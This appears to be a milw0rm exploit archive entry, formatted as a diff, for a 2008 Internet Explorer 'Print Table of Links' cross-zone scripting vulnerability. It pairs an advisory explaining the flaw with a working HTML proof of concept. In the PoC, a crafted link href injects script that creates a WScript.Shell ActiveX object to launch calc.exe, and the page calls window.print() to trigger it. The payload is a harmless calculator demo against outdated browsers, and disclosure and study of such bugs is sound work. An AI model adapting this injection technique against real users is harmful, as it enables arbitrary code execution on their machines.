@@ -1,0 +1,58 @@
+<!--
+Internet Explorer "Print Table of Links" Cross-Zone Scripting Vulnerability
+
+Author: Aviv Raff 
+http://aviv.raffon.net/
+
+Summary
+
+Internet Explorer is prone to a Cross-Zone Scripting vulnerability in 
+its “Print Table of Links” feature. This feature allows users to add to 
+a printed web page an appendix which contains a table of all the links 
+in that webpage. 
+
+An attacker can easily add a specially crafted link to a webpage (e.g. 
+at his own website, comments in blogs, social networks, Wikipedia, 
+etc.), so whenever a user will print this webpage with this feature 
+enabled, the attacker will be able to run arbitrary code on the user’s 
+machine (i.e. in order to take control over the machine). 
+
+Affected version
+
+Internet Explorer 7.0 and 8.0b on a fully patched Windows XP.
+Windows Vista with UAC enabled is partially affected (Information Leakage only).
+Earlier versions of Internet Explorer may also be affected.
+
+Technical details
+
+Whenever a user prints a page, Internet Explorer uses a local resource 
+script which generates an new HTML to be printed. This HTML consists of 
+the following elements: Header, webpage body, Footer, and if enabled, 
+also the table of links in the webpage. 
+
+While the script takes only the text within the link’s inner data, it 
+does not validate the URL of links, and add it to the HTML as it is. 
+This allows to inject a script that will be executed when the new HTML 
+will be generated. 
+
+As I said in a previous post, most of the local resources in Internet 
+Explorer are now running in Internet Zone. Unfortunately, the printing 
+local resource script is running in Local Machine Zone, which means that 
+any injected script can execute arbitrary code on the user’s machine. 
+
+Proof of Concept
+
+The following is an example of a URL which executes Windows Calculator:
+
+http://www.google.com/?q=<script defer>new ActiveXObject(“Wscript.Shell”).run(“calc”)</script>
+-->
+
+<html>
+<body>
+Print me with table of links to execute calc.exe
+<a href="http://www.bla.com?x=b<script defer >var x=new ActiveXObject('WScript.Shell');x.Run('calc.exe');</script>a.c<u>o</u>m"></a>
+<script>window.print();</script>
+</body>
+</html>
+
+# milw0rm.com [2008-05-14]
